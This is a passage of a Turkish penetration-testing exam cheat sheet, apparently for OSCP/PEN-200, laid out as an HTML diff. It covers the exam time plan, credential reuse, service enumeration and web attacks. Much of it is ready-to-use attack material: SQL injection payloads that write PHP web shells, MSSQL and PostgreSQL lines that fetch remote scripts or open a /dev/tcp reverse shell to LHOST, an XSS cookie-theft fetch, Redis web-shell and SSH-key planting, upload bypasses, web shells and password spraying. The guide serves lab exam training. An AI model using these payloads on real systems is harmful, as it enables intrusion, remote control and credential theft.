+<h2 id="21-zaman-planı-0900-başlangıç-örneği">2.1 Zaman planı (09:00 başlangıç örneği)</h2>
+<table>
+<thead>
+<tr>
+<th>Saat</th>
+<th>İş</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>08:15–09:00</td>
+<td>Gözetmen kontrolü, VPN, <code>vars.sh</code>, tmux, not şablonları</td>
+</tr>
+<tr>
+<td>09:00–13:00</td>
+<td><strong>AD seti</strong> (verilen kullanıcıyla enum → makine 1 → makine 2 → DC)</td>
+</tr>
+<tr>
+<td>13:00–13:45</td>
+<td>Ara: yemek, ekrandan uzak</td>
+</tr>
+<tr>
+<td>13:45–17:45</td>
+<td>Bağımsız makine A ve B — her birine <strong>en fazla 2 saat</strong>, sonra park et</td>
+</tr>
+<tr>
+<td>17:45–18:30</td>
+<td>Ara</td>
+</tr>
+<tr>
+<td>18:30–21:30</td>
+<td>Bağımsız makine C + park edilenlere ikinci tur</td>
+</tr>
+<tr>
+<td>21:30–22:00</td>
+<td>Puan kontrolü: hangi flag'ler panelde? Ekran görüntüleri tam mı?</td>
+</tr>
+<tr>
+<td>22:00–03:00</td>
+<td>Eksik privesc'ler / takılanlar</td>
+</tr>
+<tr>
+<td><strong>03:00–07:00</strong></td>
+<td><strong>Uyku</strong> (alarm kur; gözetmene ara verdiğini bildir)</td>
+</tr>
+<tr>
+<td>07:00–08:45</td>
+<td>Taze kafayla son deneme + eksik ekran görüntüleri + notları toparla</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Rapor için ayrıca 24 saatin var; sınavın son saatlerini rapor <strong>yazmaya</strong> değil, <strong>kanıt toplamaya</strong> harca. Sınav bitince makinelere erişim kesilir — eksik ekran görüntüsü sonradan alınamaz.</li>
+<li>Ciddi bir puan biriktirdiğinde (eski kurala göre 70): dur, tüm kanıtları ve panel girişlerini ikinci kez kontrol et, sonra devam et. 1 Aralık 2026 sonrası sabit eşik olmadığından "yeter" diye bırakma; süre varsa devam et.</li>
+<li>Her ara için gözetmene sohbetten haber ver.</li>
+</ul>
+<h2 id="22-ortam-kurulumu-bir-kez">2.2 Ortam kurulumu (bir kez)</h2>
+<pre><code class="language-bash">mkdir -p ~/exam/{recon,exploits,loot,notes,screens,tools}
+cd ~/exam &amp;&amp; tmux new -s exam
+# Pencere düzeni:  0: http.server   1: listener   2: komutlar   3: notlar
+# Ctrl+b c  yeni pencere   Ctrl+b n/p  geçiş   Ctrl+b %  dikey böl
+script -a ~/exam/notes/session-$(date +%F).log      # tüm terminal kaydı
+</code></pre>
+<p>Önceden indir, <code>~/exam/tools/</code> altında hazır tut (sınavda GitHub'a gitmekle vakit kaybetme):</p>
+<table>
+<thead>
+<tr>
+<th>Linux</th>
+<th>Windows</th>
+<th>AD / pivot</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>linpeas.sh, pspy64, lse.sh</td>
+<td>winPEASx64.exe, winPEAS.bat, PowerUp.ps1, SharpUp.exe</td>
+<td>SharpHound.exe/.ps1, PowerView.ps1, Rubeus.exe</td>
+</tr>
+<tr>
+<td>linux-exploit-suggester.sh</td>
+<td>PrintSpoofer64.exe, GodPotato-NET4.exe, JuicyPotatoNG.exe</td>
+<td>mimikatz.exe (x64), RunasCs.exe</td>
+</tr>
+<tr>
+<td>socat (statik), nc (statik)</td>
+<td>nc64.exe, accesschk64.exe, Seatbelt.exe</td>
+<td>chisel (linux+windows), ligolo-ng proxy + agent (linux+windows)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="23-not-şablonu-her-hedef-için-kopyala">2.3 Not şablonu (her hedef için kopyala)</h2>
+<pre><code class="language-markdown"># &lt;IP&gt; — &lt;hostname&gt; — &lt;OS&gt;
+## Portlar / servisler
+## Bulunan kimlik bilgileri
+| kullanıcı | parola / hash | kaynak | nerede denendi | sonuç |
+## Denenen yollar
+- [x] /admin login — default creds OLMADI
+- [ ] SMB share &quot;backup&quot; — indirilmedi
+## Initial access   (komutlar + değiştirilen exploit satırları)
+## Privesc          (komutlar)
+## Flagler          local: ____ (panelde ✔)   proof: ____ (panelde ✔)
+## Ekran görüntüleri  01-&lt;host&gt;-local.png ...
+</code></pre>
+<p>Rapor bu notların temizlenmiş hâlidir. <strong>Sonuç üreten her komutu</strong> (ve exploit'te değiştirdiğin her satırı) buraya yapıştır.</p>
+<h2 id="otuz-dakika">2.4 30 dakika kuralı (kilitlenme protokolü)</h2>
+<p>30 dakikadır <strong>yeni bilgi</strong> (port, dizin, kullanıcı, hata mesajı, kimlik) yoksa:</p>
+<ol>
+<li>Dur. 2 dakika ekrandan kalk.</li>
+<li><strong>Tam TCP</strong> taraması bitti mi? <code>-p-</code> sonuçlarını gerçekten okudun mu? UDP (161!) baktın mı?</li>
+<li>Her servisin <strong>tam sürümünü</strong> yaz ve <code>searchsploit</code> + Google'da tek tek ara.</li>
+<li>Web: kaynak kod, JS dosyaları, yorumlar, <code>/.git/</code>, yedek dosyalar, vhost, farklı uzantılar (<code>-x php,txt,bak,zip</code>).</li>
+<li>Elindeki <strong>her kimlik bilgisini her serviste</strong> denedin mi? (bkz. 2.5) Kullanıcı adını parola olarak denedin mi?</li>
+<li>Daha önce "boş" dediğin şeye geri dön (anonim FTP'deki bir dosya, SMB'deki bir share).</li>
+<li>Hâlâ yoksa: <strong>park et</strong>, başka makineye geç. Batık maliyet tuzağına düşme.</li>
+</ol>
+<h2 id="25-kimlik-bilgisi-yeniden-kullanım-matrisi">2.5 Kimlik bilgisi yeniden kullanım matrisi</h2>
+<p>Yeni bir parola/hash bulduğun <strong>an</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Bulunan</th>
+<th>Hemen dene</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Herhangi bir parola</td>
+<td>Bilinen tüm kullanıcılarla SSH, SMB, WinRM, RDP, MSSQL, web login, <code>su</code></td>
+</tr>
+<tr>
+<td>Web / CMS admin</td>
+<td>Aynı parola ile SSH ve DB; admin paneldeki RCE özellikleri</td>
+</tr>
+<tr>
+<td>DB parolası (config dosyası)</td>
+<td>DB'deki kullanıcı tablosu (hash'ler), aynı parola ile SSH / <code>su</code></td>
+</tr>
+<tr>
+<td><code>id_rsa</code></td>
+<td><code>chmod 600</code>; tüm kullanıcılarla dene; passphrase varsa <code>ssh2john</code></td>
+</tr>
+<tr>
+<td>NTLM hash</td>
+<td>Kırmadan önce <strong>Pass-the-Hash</strong>: <code>nxc smb/winrm</code>, <code>evil-winrm -H</code>, <code>impacket-*exec -hashes</code></td>
+</tr>
+<tr>
+<td>Yerel Administrator hash</td>
+<td><code>nxc smb &lt;subnet&gt; -u administrator -H &lt;NTLM&gt; --local-auth</code> (yerel admin parolası tekrar kullanımı)</td>
+</tr>
+<tr>
+<td>Kerberoast / AS-REP hash</td>
+<td><code>hashcat -m 13100</code> / <code>-m 18200</code> → parola → her yerde dene</td>
+</tr>
+<tr>
+<td><code>.kdbx</code> (KeePass)</td>
+<td><code>keepass2john</code> → kır → içindeki tüm parolalar</td>
+</tr>
+<tr>
+<td>Domain kullanıcı listesi</td>
+<td>Bulduğun parolaları bu listeye <strong>spray</strong> et (kilitlenme politikasına dikkat)</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># Tek komutla toplu deneme (kullanıcılar ve parolalar dosyada)
+nxc smb $IP   -u users.txt -p passwords.txt --continue-on-success
+nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success
+nxc ssh $IP   -u users.txt -p passwords.txt --continue-on-success
+nxc rdp $IP   -u users.txt -p passwords.txt --continue-on-success
+nxc mssql $IP -u users.txt -p passwords.txt --continue-on-success
+</code></pre>
+<div class="admonition tip">
+<p class="admonition-title"><code>(Pwn3d!)</code> ne demek?</p>
+<p>nxc çıktısında <code>(Pwn3d!)</code> görüyorsan o kullanıcı o makinede <strong>yerel admin</strong>dir (SMB) veya komut çalıştırabilir (WinRM). Doğrudan <code>impacket-psexec</code> / <code>evil-winrm</code> ile gir.</p>
+</div>
+<hr />
+<h1 id="3-keşif-ve-servis-enumerasyonu">3. Keşif ve servis enumerasyonu</h1>
+<h2 id="31-nmap-tek-akış">3.1 Nmap — tek akış</h2>
+<pre><code class="language-bash">cd ~/exam/recon
+# 1) Tüm TCP portları (arka planda başlat, beklerken web'e bak)
+sudo nmap -p- --min-rate 5000 -Pn -oN $IP-all.txt $IP
+# 2) Açık portlarda sürüm + varsayılan script
+PORTS=$(grep -oP '^\d+(?=/tcp\s+open)' $IP-all.txt | paste -sd,)
+sudo nmap -sC -sV -p$PORTS -Pn -oA $IP-svc $IP
+# 3) UDP (SNMP, TFTP, DNS için mutlaka)
+sudo nmap -sU --top-ports 50 -Pn --open -oN $IP-udp.txt $IP
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Durum</th>
+<th>Ne yap</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--min-rate 5000</code> port kaçırıyor gibi</td>
+<td><code>-T4 --max-retries 2</code> ile tekrar, ya da <code>rustscan -a $IP -- -sC -sV</code></td>
+</tr>
+<tr>
+<td>Tüm portlar <code>filtered</code></td>
+<td><code>-Pn</code> var mı? Daha yavaş: <code>-T3</code>; ICMP kapalı olabilir</td>
+</tr>
+<tr>
+<td>Garip servis</td>
+<td><code>nmap -sV --version-all -p&lt;port&gt;</code>, <code>nc -nv $IP &lt;port&gt;</code> ile banner</td>
+</tr>
+<tr>
+<td>Sadece birkaç port</td>
+<td>Saldırı yüzeyi az demek: o servisleri <strong>çok derin</strong> incele</td>
+</tr>
+</tbody>
+</table>
+<p>Faydalı NSE: <code>--script vuln</code> (genel), <code>smb-vuln-ms17-010</code>, <code>http-enum</code>, <code>ftp-anon</code>, <code>nfs-showmount</code>, <code>snmp-*</code>.</p>
+<h2 id="32-port-ilk-yapılacaklar">3.2 Port → ilk yapılacaklar</h2>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Servis</th>
+<th>İlk kontrol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>FTP</td>
+<td>anonymous, yazma izni (web köküyse → shell), sürüm CVE</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>bulunan anahtar/parolalar; nadiren CVE</td>
+</tr>
+<tr>
+<td>25/587</td>
+<td>SMTP</td>
+<td><code>VRFY</code>/<code>RCPT</code> kullanıcı enum; istemci saldırısı için e-posta gönderimi</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS</td>
+<td>zone transfer (AXFR), alt alan adları</td>
+</tr>
+<tr>
+<td>80/443/8080…</td>
+<td>HTTP</td>
+<td>Bölüm 4</td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td><strong>DC işareti</strong>; <code>kerbrute userenum</code>, AS-REP</td>
+</tr>
+<tr>
+<td>111/2049</td>
+<td>NFS</td>
+<td><code>showmount -e</code>, <code>no_root_squash</code></td>
+</tr>
+<tr>
+<td>135/139/445</td>
+<td>RPC/SMB</td>
+<td>null/guest oturum, share'ler, RID brute, imzalama</td>
+</tr>
+<tr>
+<td>161/udp</td>
+<td>SNMP</td>
+<td><code>public</code> community, kullanıcılar, süreç argümanlarında parolalar</td>
+</tr>
+<tr>
+<td>389/636/3268</td>
+<td>LDAP</td>
+<td>anonim bind, kullanıcı açıklamalarında parola</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td><code>sa</code> / domain auth, <code>xp_cmdshell</code>, <code>xp_dirtree</code></td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+<td>root boş parola, <code>INTO OUTFILE</code>, UDF</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP</td>
+<td>bulunan kimliklerle giriş (GUI → daha kolay privesc enum)</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>PostgreSQL</td>
+<td><code>postgres:postgres</code>, <code>COPY ... FROM PROGRAM</code> → RCE</td>
+</tr>
+<tr>
+<td>5985/5986</td>
+<td>WinRM</td>
+<td><code>evil-winrm</code> (parola veya hash)</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis</td>
+<td>auth yok → web kökü/SSH anahtarı/cron yazma</td>
+</tr>
+<tr>
+<td>27017</td>
+<td>MongoDB</td>
+<td>auth yok mu</td>
+</tr>
+</tbody>
+</table>
+<h2 id="33-ftp-21">3.3 FTP (21)</h2>
+<pre><code class="language-bash">ftp anonymous@$IP                 # parola: boş veya anonymous
+# ftp&gt;  passive / binary / ls -la / get dosya / put test.txt
+wget -m --no-passive ftp://anonymous:anonymous@$IP     # her şeyi indir
+nmap -p21 --script ftp-anon,ftp-syst $IP
+</code></pre>
+<h2 id="34-smb-rpc-139-445">3.4 SMB / RPC (139, 445)</h2>
+<pre><code class="language-bash"># Null ve guest oturumu
+nxc smb $IP -u '' -p '' --shares
+nxc smb $IP -u 'guest' -p '' --shares
+smbclient -N -L //$IP
+smbmap -H $IP -u guest
+
+# Kullanıcı listesi: RID brute (guest/null çalışıyorsa çok değerli)
+nxc smb $IP -u guest -p '' --rid-brute 4000 | grep SidTypeUser
+impacket-lookupsid guest@$IP -no-pass
+
+# Genel enum
+enum4linux-ng -A $IP
+rpcclient -U '' -N $IP        # &gt; enumdomusers  &gt; querydispinfo (açıklamalarda parola!)
+
+# Share'i tümden indir
+smbclient //$IP/share -N -c 'prompt OFF; recurse ON; mget *'
+# veya kimlikle, tüm okunabilir share'lerden dosya avla
+nxc smb $IP -u $USER -p $PASS -M spider_plus -o DOWNLOAD_FLAG=True
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Bulgu</th>
+<th>Anlamı</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>READ share</td>
+<td>Config, script, yedek, <code>.kdbx</code>, <code>.xml</code> (GPP) ara</td>
+</tr>
+<tr>
+<td>WRITE share</td>
+<td>Web köküyse shell; kullanıcıların açtığı bir share ise <code>.lnk</code>/<code>.url</code> ile NetNTLMv2 yakalama (sadece kendi <code>impacket-smbserver</code>'ınla, spoofing değil)</td>
+</tr>
+<tr>
+<td><code>signing:False</code></td>
+<td>Relay mümkün (sınav dışı ileri teknik, bkz. 10.10)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="35-snmp-161udp">3.5 SNMP (161/udp)</h2>
+<pre><code class="language-bash">onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
+snmpwalk -v2c -c public $IP | tee snmp.txt
+snmpbulkwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects   # özel script çıktıları (parola!)
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.5    # süreç argümanları
+snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25     # Windows kullanıcıları
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2    # kurulu yazılımlar
+</code></pre>
+<h2 id="36-ldap-kerberos-389-88">3.6 LDAP / Kerberos (389, 88)</h2>
+<pre><code class="language-bash">ldapsearch -x -H ldap://$IP -s base namingcontexts
+ldapsearch -x -H ldap://$IP -b &quot;DC=corp,DC=local&quot; &quot;(objectClass=user)&quot; sAMAccountName description
+# Kimlikle
+nxc ldap $IP -u $USER -p $PASS --users            # açıklama alanlarını oku
+# Kullanıcı adı doğrulama (kimlik gerekmez)
+kerbrute userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</code></pre>
+<h2 id="37-nfs-smtp-dns-veritabanları-redis">3.7 NFS, SMTP, DNS, veritabanları, Redis</h2>
+<pre><code class="language-bash"># NFS
+showmount -e $IP
+sudo mount -t nfs -o vers=3,nolock $IP:/export /mnt/nfs     # sonra ls -lan
+# SMTP kullanıcı enum
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
+# DNS
+dig axfr @$IP $DOMAIN
+# MySQL
+mysql -h $IP -u root -p --skip-ssl
+# MSSQL
+impacket-mssqlclient $USER:$PASS@$IP -windows-auth       # domain hesabı
+impacket-mssqlclient sa:$PASS@$IP                        # SQL hesabı
+# PostgreSQL → RCE (superuser ise)
+psql -h $IP -U postgres
+#   CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c;
+# Redis
+redis-cli -h $IP info
+</code></pre>
+<p><strong>Redis (auth yok) → web shell veya SSH anahtarı:</strong></p>
+<pre><code class="language-bash">redis-cli -h $IP config set dir /var/www/html
+redis-cli -h $IP config set dbfilename shell.php
+redis-cli -h $IP set x '&lt;?php system($_GET[&quot;c&quot;]); ?&gt;'
+redis-cli -h $IP save
+# SSH anahtarı (redis kullanıcısının ev dizini veya /root/.ssh yazılabiliyorsa)
+(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt
+cat key.txt | redis-cli -h $IP -x set k
+redis-cli -h $IP config set dir /var/lib/redis/.ssh
+redis-cli -h $IP config set dbfilename authorized_keys
+redis-cli -h $IP save
+</code></pre>
+<hr />
+<h1 id="4-web-uygulamaları">4. Web uygulamaları</h1>
+<h2 id="41-web-öncelik-sırası">4.1 Web öncelik sırası</h2>
+<ol>
+<li>Sayfayı <strong>bir kullanıcı gibi gez</strong> (Burp Community açık, proxy geçmişi kayıtta). Kaynak kod, yorumlar, JS dosyaları.</li>
+<li>Teknoloji: <code>whatweb -a 3 http://$IP</code>, response header'ları, cookie adları, hata sayfası. <strong>Sürüm numarası bulursan hemen exploit ara.</strong></li>
+<li><code>/robots.txt</code>, <code>/sitemap.xml</code>, <code>/.git/HEAD</code>, <code>/.env</code>, <code>/backup</code>, <code>/admin</code>.</li>
+<li>Dizin/dosya keşfi (uzantılarla) ve vhost keşfi.</li>
+<li>Login varsa: default kimlikler → kullanıcı enum → SQLi → zayıf parola brute.</li>
+<li>Her parametre: SQLi, LFI/traversal, komut enjeksiyonu, SSTI.</li>
+<li>Dosya yükleme varsa: uzantı/içerik bypass.</li>
+</ol>
+<h2 id="42-i̇çerik-ve-vhost-keşfi">4.2 İçerik ve vhost keşfi</h2>
+<pre><code class="language-bash">W=/usr/share/seclists/Discovery/Web-Content
+feroxbuster -u http://$IP -w $W/raft-medium-directories.txt -x php,txt,html,bak,zip -t 50 -o ferox.txt
+ffuf -u http://$IP/FUZZ -w $W/raft-medium-files.txt -ac                   # dosyalar
+gobuster dir -u http://$IP -w $W/directory-list-2.3-medium.txt -x php,txt -t 40 -b 404,403
+
+# vhost (önce /etc/hosts'a ekle: echo &quot;$IP site.htb&quot; | sudo tee -a /etc/hosts)
+ffuf -u http://$IP -H &quot;Host: FUZZ.$DOMAIN&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
+
+# Parametre keşfi
+ffuf -u &quot;http://$IP/page.php?FUZZ=test&quot; -w $W/burp-parameter-names.txt -ac
+</code></pre>
+<p><code>-ac</code> (otomatik kalibrasyon) yanlış pozitifleri ayıklar; yetmezse <code>-fs &lt;boyut&gt;</code>, <code>-fc 404</code>, <code>-fw &lt;kelime&gt;</code> ile manuel filtrele.</p>
+<p><strong>Açık <code>.git</code> bulursan:</strong></p>
+<pre><code class="language-bash">git-dumper http://$IP/.git ./repo &amp;&amp; cd repo
+git log -p | grep -iE 'pass|secret|key|token' ; git show &lt;commit&gt;
+</code></pre>
+<h2 id="43-varsayılan-kimlik-bilgileri">4.3 Varsayılan kimlik bilgileri</h2>
+<table>
+<thead>
+<tr>
+<th>Uygulama</th>
+<th>Dene</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tomcat Manager</td>
+<td><code>tomcat:s3cret</code>, <code>tomcat:tomcat</code>, <code>admin:admin</code></td>
+</tr>
+<tr>
+<td>Jenkins</td>
+<td><code>admin:admin</code>, kayıt açık mı</td>
+</tr>
+<tr>
+<td>phpMyAdmin / MySQL</td>
+<td><code>root:</code> (boş), <code>root:root</code></td>
+</tr>
+<tr>
+<td>Grafana / Zabbix / GLPI</td>
+<td><code>admin:admin</code>, <code>Admin:zabbix</code>, <code>glpi:glpi</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>sa:</code> (boş), <code>sa:sa</code></td>
+</tr>
+<tr>
+<td>Genel</td>
+<td><code>admin:admin</code>, <code>admin:password</code>, <strong>kullanıcı adı = parola</strong>, ürün adı = parola</td>
+</tr>
+</tbody>
+</table>
+<p>Bilinmeyen ürün: <code>"&lt;ürün adı&gt; default password"</code> diye ara.</p>
+<h2 id="44-sql-injection-manuel-sqlmap-sınavda-yasak">4.4 SQL Injection (manuel — sqlmap sınavda yasak)</h2>
+<p><strong>Tespit:</strong></p>
+<pre><code class="language-sql">'
+' OR 1=1-- -
+' AND 1=1-- -     ↔     ' AND 1=2-- -     -- sayfa değişiyor mu? (boolean)
+' AND SLEEP(5)-- -                         -- MySQL time-based
+'; WAITFOR DELAY '0:0:5'-- -               -- MSSQL
+'; SELECT pg_sleep(5)-- -                  -- PostgreSQL
+</code></pre>
+<p><strong>UNION ile veri çekme (MySQL):</strong></p>
+<pre><code class="language-sql">' ORDER BY 1-- -                    -- hata verene kadar artır → kolon sayısı N
+' UNION SELECT 1,2,3,4-- -          -- ekranda görünen kolonu bul
+' UNION SELECT 1,database(),user(),@@version-- -
+' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
+</code></pre>
+<p><strong>Dosya okuma/yazma → RCE (MySQL, FILE yetkisi):</strong></p>
+<pre><code class="language-sql">' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
+' UNION SELECT 1,'&lt;?php system($_GET[&quot;c&quot;]); ?&gt;',3,4 INTO OUTFILE '/var/www/html/s.php'-- -
+</code></pre>
+<p><strong>MSSQL → komut çalıştırma (stacked query):</strong></p>
+<pre><code class="language-sql">'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
+'; EXEC xp_cmdshell 'powershell -c &quot;IEX(IWR http://<span class="ph">LHOST</span>/rev.ps1 -UseBasicParsing)&quot;';-- -
+</code></pre>
+<p><strong>PostgreSQL → komut:</strong></p>
+<pre><code class="language-sql">'; CREATE TABLE c(o text); COPY c FROM PROGRAM 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="ph">LHOST</span>/443 0&gt;&amp;1&quot;';-- -
+</code></pre>
+<p>Kör (blind) SQLi'de veriyi karakter karakter çek: <code>' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -</code>. Bunu Burp Intruder (Community) veya kısa bir Python döngüsüyle otomatikleştirmek <strong>kendi script'in</strong> olduğu için serbesttir.</p>
+<h2 id="45-directory-traversal-lfi-rfi">4.5 Directory traversal / LFI / RFI</h2>
+<pre><code class="language-text">../../../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+C:\Windows\System32\drivers\etc\hosts      (Windows: ..\..\..\  dene)
+php://filter/convert.base64-encode/resource=index.php    → kaynak kodu oku
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&amp;c=id
+</code></pre>
+<p>Okunacak değerli dosyalar: <code>/home/*/.ssh/id_rsa</code>, <code>/var/www/html/config.php</code>, <code>wp-config.php</code>, <code>/etc/apache2/sites-enabled/000-default.conf</code>, <code>C:\inetpub\wwwroot\web.config</code>, <code>C:\xampp\apache\conf\httpd.conf</code>, <code>C:\Users\&lt;user&gt;\.ssh\id_rsa</code>.</p>
+<p><strong>Log poisoning (LFI → RCE):</strong></p>
+<pre><code class="language-bash">curl -s &quot;http://$IP/&quot; -A '&lt;?php system($_GET[&quot;c&quot;]); ?&gt;'
+curl &quot;http://$IP/index.php?page=/var/log/apache2/access.log&amp;c=id&quot;
+# Windows XAMPP: C:\xampp\apache\logs\access.log
+</code></pre>
+<p><strong>RFI</strong> (<code>allow_url_include=On</code> ise): <code>?page=http://LHOST/shell.php&amp;c=id</code> (Kali'de <code>python3 -m http.server 80</code>).</p>
+<h2 id="46-dosya-yükleme-bypass">4.6 Dosya yükleme bypass</h2>
+<pre><code class="language-text">shell.php  shell.phtml  shell.php5  shell.phar  shell.pHp       (uzantı listesi)
+shell.php.jpg  shell.jpg.php                                    (çift uzantı)
+Content-Type: image/jpeg    + gövde başına  GIF89a;             (MIME/magic)
+.htaccess  →  AddType application/x-httpd-php .xyz              (sonra shell.xyz yükle)
+shell.aspx / shell.asp / web.config                             (IIS)
+</code></pre>
+<p>Yükleme sonrası: dosya nereye gitti? (<code>/uploads/</code>, yanıt içindeki URL). Çalışmıyorsa: dosya adı değiştiriliyor mu, path traversal ile farklı dizine yazılabiliyor mu (<code>../../shell.php</code>)? SSH anahtarını <code>../../../../root/.ssh/authorized_keys</code> olarak yazmak klasik bir PEN-200 senaryosudur.</p>
+<p>Minimal webshell'ler:</p>
+<pre><code class="language-php">&lt;?php system($_GET['c']); ?&gt;
+</code></pre>
+<pre><code class="language-aspx">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;% System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c &quot; + Request[&quot;c&quot;]); %&gt;
+</code></pre>
+<p>Kali'de hazır: <code>/usr/share/webshells/</code> (php, asp, aspx, jsp) ve <code>/usr/share/laudanum/</code>.</p>
+<h2 id="47-komut-enjeksiyonu">4.7 Komut enjeksiyonu</h2>
+<pre><code class="language-text">; id    | id    || id    &amp; id    &amp;&amp; id    $(id)    `id`    %0aid
+</code></pre>
+<p>Kör ise: <code>; sleep 5</code> veya <code>; curl http://LHOST/$(whoami)</code> (Kali'de http.server loguna bak) veya <code>; ping -c 2 LHOST</code> (<code>sudo tcpdump -i tun0 icmp</code>).</p>
+<p>Windows'ta komutun cmd mi PowerShell mi çalıştığını anla:</p>
+<pre><code class="language-text">(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
+</code></pre>
+<p>Filtre bypass: boşluk yerine <code>${IFS}</code>; yasaklı kelime için <code>w'h'o'a'm'i</code>; hepsi yasaksa <code>echo &lt;base64&gt; | base64 -d | bash</code>.</p>
+<h2 id="48-ssti">4.8 SSTI</h2>
+<pre><code class="language-text">${{&lt;%[%'&quot;}}%\.          ← hata veriyorsa şablon motoru var
+{{7*7}}  → 49  : Jinja2 / Twig      {{7*'7'}} → 7777777 Jinja2,  49 Twig
+${7*7}   → 49  : Freemarker / Velocity
+&lt;%= 7*7 %&gt; → 49 : ERB (Ruby)
+</code></pre>
+<pre><code class="language-text">Jinja2:  {{ lipsum.__globals__[&quot;os&quot;].popen(&quot;id&quot;).read() }}
+Twig:    {{['id']|filter('system')}}
+Freemarker: &lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${ex(&quot;id&quot;)}
+</code></pre>
+<h2 id="49-xss-xxe-ssrf-kısa">4.9 XSS, XXE, SSRF (kısa)</h2>
+<ul>
+<li><strong>XSS</strong> (PEN-200 konusu): Admin'in görüntülediği bir alana (User-Agent, yorum, iletişim formu) payload → admin'in cookie'si (<code>HttpOnly</code> değilse) veya admin adına istek (ör. WordPress'te yeni admin kullanıcı oluşturan JS).
+  <code>&lt;script&gt;fetch('http://LHOST/?c='+document.cookie)&lt;/script&gt;</code></li>
+<li><strong>XXE:</strong> <code>&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;</code> — XML alan her uç noktada, SVG/DOCX yüklemelerinde dene.</li>
+<li><strong>SSRF:</strong> <code>http://127.0.0.1:&lt;port&gt;/</code> ile iç servisleri tara; Windows'ta <code>\\LHOST\x</code> / <code>http://LHOST</code> ile servis hesabının NetNTLMv2'sini <code>impacket-smbserver</code> / <code>responder -A</code> olmadan yakalamak için kendi SMB sunucunu kullan.</li>
+</ul>
+<h2 id="410-bilinen-uygulamalar-ve-klasik-cveler">4.10 Bilinen uygulamalar ve klasik CVE'ler</h2>
+<pre><code class="language-bash"># WordPress
+wpscan --url http://$IP -e vp,vt,u --plugins-detection aggressive
+#   admin olunca: Appearance → Theme File Editor → 404.php  veya  shell içeren plugin zip yükle
+# Tomcat Manager → WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f war -o rev.war
+curl -u 'tomcat:s3cret' -T rev.war &quot;http://$IP:8080/manager/text/deploy?path=/rev&quot;
+curl http://$IP:8080/rev/
+# Jenkins Script Console (/script)
+#   println &quot;id&quot;.execute().text
+# Drupal / Joomla
+droopescan scan drupal -u http://$IP ;  joomscan -u http://$IP
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Yazılım</th>
+<th>Sürüm</th>
+<th>Not</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache httpd</td>
+<td>2.4.49 / 2.4.50</td>
+<td>CVE-2021-41773 / 42013 path traversal → RCE (CGI açıksa)</td>
+</tr>
+<tr>
+<td>Samba</td>
+<td>3.0.20–3.0.25rc3</td>
+<td><code>usermap_script</code> CVE-2007-2447</td>
+</tr>
+<tr>
+<td>Samba</td>
+<td>3.5.0–4.6.4</td>
+<td>SambaCry CVE-2017-7494 (yazılabilir share)</td>
+</tr>
+<tr>
+<td>vsftpd</td>
+<td>2.3.4</td>
+<td>backdoor</td>
+</tr>
+<tr>
+<td>Drupal</td>
+<td>7.x / 8.x</td>
+<td>Drupalgeddon2 CVE-2018-7600</td>
+</tr>
+<tr>
